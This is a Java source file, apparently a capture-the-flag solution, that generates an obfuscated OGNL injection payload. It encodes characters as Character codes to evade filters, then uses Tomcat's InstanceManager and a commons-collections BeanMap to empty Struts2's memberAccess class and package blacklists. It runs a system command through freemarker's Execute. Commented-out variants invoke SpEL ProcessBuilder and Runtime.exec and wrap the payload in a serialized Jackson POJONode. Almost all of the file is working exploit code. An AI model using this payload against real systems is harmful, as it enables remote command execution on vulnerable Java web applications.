package dev.silente.javashark.solution;

import com.ctf.expr.entity.User;
import com.fasterxml.jackson.databind.node.POJONode;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;
import ognl.Ognl;
import ognl.OgnlContext;

public class DFJK2023El {
    static String getChar(char ch) {
        return "(#" + (char)ch + " = new Character(" + (int)ch + ").toString())";
    }

    static String generateChar() {
        StringBuffer s = new StringBuffer();
        for (char pos = 'a'; pos <= 'z'; ++pos) {
            if (pos == 'u') {
                s.append("(#aa = new Character(117).toString())");
                s.append('.');
            }
            else {
                s.append(getChar(pos));
                s.append('.');
            }
        }
        for (char pos = 'A'; pos <= 'Z'; ++pos) {
            if (pos == 'U') {
                s.append("(#AA = new Character(117).toString())");
                s.append('.');
            }
            else {
                s.append(getChar(pos));
                s.append('.');
            }
        }

        for (char pos = '0'; pos <= '9'; ++pos) {
            s.append("(#nm" + pos + " = new Character(" + (int)(pos) + ").toString())");
            s.append('.');
        }

        s.append("(#dot = new Character(" + (int)'.' + ").toString())");
        s.append('.');
        s.append("(#qqot = new Character(" + (int)'"' + ").toString())");
        s.append('.');
        s.append("(#qot = new Character(" + (int)'\'' + ").toString())");
        s.append('.');
        s.append("(#lq = new Character(" + (int)'(' + ").toString())");
        s.append('.');
        s.append("(#rq = new Character(" + (int)')' + ").toString())");
        s.append('.');
        s.append("(#lw = new Character(" + (int)'[' + ").toString())");
        s.append('.');
        s.append("(#rw = new Character(" + (int)']' + ").toString())");
        s.append('.');
        s.append("(#sb = new Character(" + (int)';' + ").toString())");
        s.append('.');
        s.append("(#eqq = new Character(" + (int)'=' + ").toString())");
        s.append('.');
        s.append("(#spaces = new Character(" + (int)' ' + ").toString())");
        s.append('.');
        s.append("(#lines = new Character(" + (int)'|' + ").toString())");
        s.append('.');
        s.append("(#neko = new Character(" + (int)'-' + ").toString())");
        s.append('.');
        s.append("(#ltt = new Character(" + (int)'{' + ").toString())");
        s.append('.');
        s.append("(#rtt = new Character(" + (int)'}' + ").toString())");
        s.append('.');
        s.append("(#plotst = new Character(" + (int)',' + ").toString())");
        s.append('.');
        s.append("(#rbq = new Character(" + (int)'/' + ").toString())");
        s.append('.');
        return s.toString();
    }

    static String makeString(String s) {
        StringBuffer make = new StringBuffer();
        char[] ss = s.toCharArray();
        for (char ch: ss) {
            if (ch == '.') {
                make.append("#dot+");
            }
            else if (ch == '\"') {
                make.append("#qqot+");
            }
            else if (ch == '\'') {
                make.append("#qot+");
            }
            else if (ch == '(') {
                make.append("#lq+");
            }
            else if (ch == ')') {
                make.append("#rq+");
            }
            else if (ch == '[') {
                make.append("#lw+");
            }
            else if (ch == ']') {
                make.append("#rw+");
            }
            else if (ch == ';') {
                make.append("#sb+");
            }
            else if (ch == '=') {
                make.append("#eqq+");
            }
            else if (ch == ' ') {
                make.append("#spaces+");
            }
            else if (ch == '|') {
                make.append("#lines+");
            }
            else if (ch == '-') {
                make.append("#neko+");
            }
            else if (ch == '{') {
                make.append("#ltt+");
            }
            else if (ch == '}') {
                make.append("#rtt+");
            }
            else if (ch == ',') {
                make.append("#plotst+");
            }
            else if (ch == '/') {
                make.append("#rbq+");
            }
            else if (ch <= '9' && ch >= '0') {
                make.append("#nm" + ch + "+");
            } else if (ch == 'u') {
                make.append("#aa+");
            } else if (ch == 'U') {
                make.append("#AA+");
            }
            else {
                make.append("#").append(ch).append("+");
            }
        }
        return make.substring(0, make.length() - 1);
    }

    public static void main(String[] args) throws Exception {

        String spel = "new java.util.Scanner(new java.lang.ProcessBuilder(\"whaomi\").start().getInputStream(), \"GBK\").useDelimiter(\"asfsfsdfsf\").next()";
//        String expr = generateChar() +
//                "(#el = #this.getClass().forName(" + makeString("org.springframework.expression.spel.standard.SpelExpressionParser") +").newInstance())." +
//                "(#inpat = #el.parseExpression(" + makeString(spel) + ").getValue())";
        String expr = generateChar() +
                "(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"])." +
                "(#stack=#attr[" + makeString("com.opensymphony.xwork2.util.ValueStack.ValueStack") +"])."+
                "(#bn=#instancemanager.newInstance(" + makeString("org.apache.commons.collections.BeanMap") + "))."+
                "(#bn.setBean(#stack)).(#context=#bn.get(\"context\"))."+
                "(#bn.setBean(#context)).(#macc=#bn.get(\"memberAccess\"))."+
//                "(#ptmethod=#bn.getClass().getMethod(" + makeString("put") + "))." +
                "(#bn.setBean(#macc)).(#emptyset=#instancemanager.newInstance(" + makeString("java.util.HashSet") + "))."+
//                "(#ptmethod.invoke(#bn, " + makeString("excludedClasses") + ",#emptyset))." +
//                "(#ptmethod.invoke(#bn, " + makeString("excludedPackageNames") + ",#emptyset))." +
                "(#bn.put(" + makeString("excludedClasses") + ",#emptyset)).(#bn.put(" + makeString("excludedPackageNames") + ",#emptyset))."+
                "(#arglist=#instancemanager.newInstance(" + makeString("java.util.ArrayList") + ")).(#arglist.add(\"whoami\"))."+
                "(#execc=#instancemanager.newInstance(" + makeString("freemarker.template.utility.Execute") + "))."+
                "(#execc.exec(#arglist))";

        
//        String expr = generateChar() +
//                "(#rantime = #this.getClass().forName(" + makeString("java.lang.Runtime") +"))." +
//                "(#getMethod = #rantime.getMethods[6])." +
//                "(#ranMethod = #rantime.getMethods[13])." +
//                "(#instine = #getMethod.invoke(null, null))." +
//                "(#resalt = #ranMethod.invoke(#instine, " + makeString("whoami") + ").getInputStream())." +
//                "(#resalt.read())";


//        OgnlContext ognlContext = new OgnlContext();
//        System.out.println(Ognl.getValue(expr, ognlContext).toString());
//
        System.out.println(expr);
//        User user = new User("foo", "bar", expr);
//        Object pojo = new POJONode(user);
//        String code = MiscUtils.base64Encode(SerializeUtils.serialize(pojo));
//        System.out.println(code);
//
//        System.out.println(pojo);
    }
}